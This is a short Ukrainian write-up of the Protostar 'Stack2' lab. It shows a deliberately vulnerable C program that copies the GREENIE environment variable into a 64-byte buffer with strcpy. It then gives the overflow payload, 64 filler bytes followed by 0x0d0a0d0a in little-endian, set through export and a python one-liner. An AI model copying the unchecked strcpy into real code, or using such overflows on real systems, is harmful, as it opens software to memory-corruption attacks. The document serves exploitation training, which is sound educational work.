# STACK2

На цьому рівні розглядаються змінні середовища та як їх можна встановити.

Вихідний код для Stack2:
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```
Нам потрібно буде встановити змінну середовища GREENIE. Нам потрібно використовувати команду export.
```
export GREENIE = someValue
```
Нам знову знадобиться 64 байти сміття (64 'а'), а потім шістнадцяткові значення в Little Endiano
```
$(python -c "print 'a'*64 + '\x0a\x0d\x0a\x0d'")
```
Тож давайте об’єднаємо їх разом.
```
export GREENIE=$(python -c "print 'a'*64 + '\x0a\x0d\x0a\x0d'");
./stack2
```
Результати:

![image](https://user-images.githubusercontent.com/47494881/147479078-7544020a-10ae-4802-91dd-4bec8c67ecae.png)





